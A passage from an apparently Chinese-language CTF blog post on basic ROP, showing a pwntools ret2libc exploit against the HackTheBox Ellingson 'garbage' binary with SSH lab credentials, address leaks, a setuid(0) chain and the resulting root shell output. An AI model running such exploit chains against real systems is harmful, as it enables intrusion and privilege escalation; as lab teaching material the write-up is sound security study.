class=\"hljs-string\">'iamgod$08'</span>)\np = r.process(<span class=\"hljs-string\">'/usr/bin/garbage'</span>)\ne = ELF(<span class=\"hljs-string\">'./garbage'</span>)\nlibc = ELF(<span class=\"hljs-string\">'./libc.so.6'</span>)\n\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nputs_got_addr = e.got[<span class=\"hljs-string\">'puts'</span>]\nstart_addr = e.symbols[<span class=\"hljs-string\">'_start'</span>]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b<span class=\"hljs-string\">'Enter access password:'</span>,payload1)\nputs_real_add = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"puts_real_add:{hex(puts_real_add)}\"</span>)\n</code></pre>\n<p>运行后我们的得到了<code>put</code>的真实地址<code>0x7f8eed3569c0</code></p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson python exp.py                              \n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21277\n[!] ASLR is disabled <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'/usr/bin/garbage'</span>!\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/garbage'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/libc.so.6'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_add = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\nputs_real_add:0x7f8eed3569c0\n</code></pre>\n<p>得到基地址，基地址 = puts 函数真实地址 - puts 函数偏移地址</p>\n<pre><code class=\"hljs language-bash\">from pwn import *\nr = ssh(host=<span class=\"hljs-string\">'ellingson.htb'</span>, user=<span class=\"hljs-string\">'margo'</span>, password=<span class=\"hljs-string\">'iamgod$08'</span>)\np = r.process(<span class=\"hljs-string\">'/usr/bin/garbage'</span>)\ne = ELF(<span class=\"hljs-string\">'./garbage'</span>)\nlibc = ELF(<span class=\"hljs-string\">'./libc.so.6'</span>)\n\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nputs_got_addr = e.got[<span class=\"hljs-string\">'puts'</span>]\nstart_addr = e.symbols[<span class=\"hljs-string\">'_start'</span>]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b<span class=\"hljs-string\">'Enter access password:'</span>,payload1)\nputs_real_addr = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"puts_real_addr:{hex(puts_real_addr)}\"</span>)\n\nlibcbase = puts_real_addr - libc.sym[<span class=\"hljs-string\">'puts'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libcbase:{hex(libcbase)}\"</span>)\n</code></pre>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21460\n[!] ASLR is disabled <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'/usr/bin/garbage'</span>!\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/garbage'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/libc.so.6'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\nputs_real_addr:0x7f7ed83509c0\nlibcbase:0x7f7ed82d0000\n</code></pre>\n<p>获得其他地址，得到基地址后，我们要得到 <code>system</code> 和 <code>/bin/sh</code>的地址</p>\n<p>函数真实地址 = 基地址 + 函数偏移值</p>\n<pre><code class=\"hljs language-bash\">from pwn import *\nr = ssh(host=<span class=\"hljs-string\">'ellingson.htb'</span>, user=<span class=\"hljs-string\">'margo'</span>, password=<span class=\"hljs-string\">'iamgod$08'</span>)\np = r.process(<span class=\"hljs-string\">'/usr/bin/garbage'</span>)\ne = ELF(<span class=\"hljs-string\">'./garbage'</span>)\nlibc = ELF(<span class=\"hljs-string\">'./libc.so.6'</span>)\n\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nputs_got_addr = e.got[<span class=\"hljs-string\">'puts'</span>]\nstart_addr = e.symbols[<span class=\"hljs-string\">'_start'</span>]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b<span class=\"hljs-string\">'Enter access password:'</span>,payload1)\nputs_real_addr = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"puts_real_addr:{hex(puts_real_addr)}\"</span>)\n\nlibcbase = puts_real_addr - libc.sym[<span class=\"hljs-string\">'puts'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libcbase:{hex(libcbase)}\"</span>)\n\nsystem_addr = libcbase + libc.sym[<span class=\"hljs-string\">'system'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"system_addr:{hex(system_addr)}\"</span>)\n\nbin_sh_addr = libcbase + next(libc.search(b<span class=\"hljs-string\">\"/bin/sh\"</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"bin_sh_addr = {hex(bin_sh_addr)}\"</span>)\n</code></pre>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 21644\n[!] ASLR is disabled <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'/usr/bin/garbage'</span>!\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/garbage'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/libc.so.6'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\nputs_real_addr:0x7f41e478b9c0\nlibcbase:0x7f41e470b000\nsystem_addr:0x7f41e475a440\nbin_sh_addr = 0x7f41e48bee9a/3\n</code></pre>\n<p><code>GetShell</code> ，得到需要的地址后，我们可以进行获取<code>Shell</code>了</p>\n<p>再此之前，我们还需要一个<code>ret</code>来实现堆栈平衡</p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson ROPgadget --binary garbage --only <span class=\"hljs-string\">\"ret\"</span>    \nGadgets information\n============================================================\n0x0000000000401016 : ret\n0x0000000000401072 : ret 0x2f\n0x000000000040153a : ret 0x4864\n0x0000000000401485 : ret 0x8d48\n0x00000000004012ce : ret 0xd089\n</code></pre>\n<pre><code class=\"hljs language-bash\">from pwn import *\nr = ssh(host=<span class=\"hljs-string\">'ellingson.htb'</span>, user=<span class=\"hljs-string\">'margo'</span>, password=<span class=\"hljs-string\">'iamgod$08'</span>)\np = r.process(<span class=\"hljs-string\">'/usr/bin/garbage'</span>)\ne = ELF(<span class=\"hljs-string\">'./garbage'</span>)\nlibc = ELF(<span class=\"hljs-string\">'./libc.so.6'</span>)\n\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nputs_got_addr = e.got[<span class=\"hljs-string\">'puts'</span>]\nstart_addr = e.symbols[<span class=\"hljs-string\">'_start'</span>]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b<span class=\"hljs-string\">'Enter access password:'</span>,payload1)\nputs_real_addr = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"puts_real_addr:{hex(puts_real_addr)}\"</span>)\n\nlibcbase = puts_real_addr - libc.sym[<span class=\"hljs-string\">'puts'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libcbase:{hex(libcbase)}\"</span>)\n\nsystem_addr = libcbase + libc.sym[<span class=\"hljs-string\">'system'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"system_addr:{hex(system_addr)}\"</span>)\n\nbin_sh_addr = libcbase + next(libc.search(b<span class=\"hljs-string\">\"/bin/sh\"</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"bin_sh_addr = {hex(bin_sh_addr)}\"</span>)\n\nret_addr = 0x0000000000401016\n\npayload2 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\np.sendline(payload2)\np.interactive()\n</code></pre>\n<p>然后我们运行，但是权限只是 <code>margo</code>的权限</p>\n<pre><code class=\"hljs language-bash\">$ $ <span class=\"hljs-built_in\">id</span>\nuid=1002(margo) gid=1002(margo) <span class=\"hljs-built_in\">groups</span>=1002(margo)\n</code></pre>\n<p><code>GetRootShell</code>，我们还需要进行将<code>shell</code>权限提升，可以使用<code>setuid</code></p>\n<pre><code class=\"hljs language-bash\">from pwn import *\nr = ssh(host=<span class=\"hljs-string\">'ellingson.htb'</span>, user=<span class=\"hljs-string\">'margo'</span>, password=<span class=\"hljs-string\">'iamgod$08'</span>)\np = r.process(<span class=\"hljs-string\">'/usr/bin/garbage'</span>)\ne = ELF(<span class=\"hljs-string\">'./garbage'</span>)\nlibc = ELF(<span class=\"hljs-string\">'./libc.so.6'</span>)\n\nputs_plt_addr = e.plt[<span class=\"hljs-string\">'puts'</span>]\nputs_got_addr = e.got[<span class=\"hljs-string\">'puts'</span>]\nstart_addr = e.symbols[<span class=\"hljs-string\">'_start'</span>]\npop_rdi_addr = 0x000000000040179b\n\npayload1 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(pop_rdi_addr) + p64(puts_got_addr) + p64(puts_plt_addr) + p64(start_addr) \np.sendlineafter(b<span class=\"hljs-string\">'Enter access password:'</span>,payload1)\nputs_real_addr = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"puts_real_addr:{hex(puts_real_addr)}\"</span>)\n\nlibcbase = puts_real_addr - libc.sym[<span class=\"hljs-string\">'puts'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"libcbase:{hex(libcbase)}\"</span>)\n\nsystem_addr = libcbase + libc.sym[<span class=\"hljs-string\">'system'</span>]\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"system_addr:{hex(system_addr)}\"</span>)\n\nbin_sh_addr = libcbase + next(libc.search(b<span class=\"hljs-string\">\"/bin/sh\"</span>))\n<span class=\"hljs-built_in\">print</span>(f<span class=\"hljs-string\">\"bin_sh_addr = {hex(bin_sh_addr)}\"</span>)\n\nret_addr = 0x0000000000401016\n\nsetuid_addr = libcbase + libc.sym[<span class=\"hljs-string\">'setuid'</span>]\n\npayload2 = b<span class=\"hljs-string\">'A'</span> * 136 + p64(ret_addr) + p64(pop_rdi_addr) + p64(0) + p64(setuid_addr) + p64(ret_addr) + p64(pop_rdi_addr) + p64(bin_sh_addr) + p64(system_addr)\n\np.sendline(payload2)\np.interactive()\n</code></pre>\n<p>运行获得 <code>RootShell</code></p>\n<pre><code class=\"hljs language-bash\">(pwn) ➜  Ellingson python exp.py\n[+] Connecting to ellingson.htb on port 22: Done\n[*] margo@ellingson.htb:\n    Distro    Ubuntu 18.04\n    OS:       linux\n    Arch:     amd64\n    Version:  4.15.0\n    ASLR:     Enabled\n    SHSTK:    Disabled\n    IBT:      Disabled\n[+] Starting remote process None on ellingson.htb: pid 22208\n[!] ASLR is disabled <span class=\"hljs-keyword\">for</span> <span class=\"hljs-string\">'/usr/bin/garbage'</span>!\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/garbage'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    Stripped:   No\n[*] <span class=\"hljs-string\">'/root/Desktop/HackTheBox/Ellingson/libc.so.6'</span>\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      Canary found\n    NX:         NX enabled\n    PIE:        PIE enabled\n/root/Desktop/HackTheBox/Ellingson/exp.py:14: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes\n  puts_real_addr = u64(p.recvuntil(<span class=\"hljs-string\">'\\x7f'</span>)[-6:].ljust(8, b<span class=\"hljs-string\">'\\x00'</span>))\nputs_real_addr:0x7fc6c64fd9c0\nlibcbase:0x7fc6c647d000\nsystem_addr:0x7fc6c64cc440\nbin_sh_addr = 0x7fc6c6630e9a\n[*] Switching to interactive mode\n\nEnter access password: \naccess denied.\n<span class=\"hljs-comment\"># $ id</span>\nuid=0(root) gid=1002(margo) <span class=\"hljs-built_in\">groups</span>=1002(margo)\n</code></pre>","title":"PWN - 基本ROP","date":"2025-06-14","updated":"2025-06-15","tags":["PWN","ROP","ret2text","ret2shellcode","ret2syscall","ret2libc"],"categories":"二进制安全","comments":true,"description":"PWN - 基本ROP\n\n https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/\n \n\n这里用到的所有题目：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/stackoverflow/\n\n`HackTheBox ..."},"recentPosts":[{"id":"TheHackersLabsOfusPingu","title":"TheHackersLabs - OfusPingu","date":"2025-08-05","isEncrypted":false,"year":"2025","month":"08","day":"05"},{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"},{"id":"HackTheBoxSeason8 - Editor","title":"HackTheBox - Season8 - Editor","date":"2025-08-03","isEncrypted":true,"year":"2025","month":"08","day":"03"},{"id":"TheHackersLabsHellRoot","title":"TheHackersLabs - HellRoot","date":"2025-08-02","isEncrypted":false,"year":"2025","month":"08","day":"02"},{"id":"群U靶机 - Cliv2","title":"群U靶机 - Cliv2","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsMerchan","title":"TheHackersLabs - Merchan","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"},{"id":"TheHackersLabsHEXTHINK SILENT SHADOW","title":"TheHackersLabs - HEXTHINK SILENT SHADOW","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"}]},"__N_SSG":true}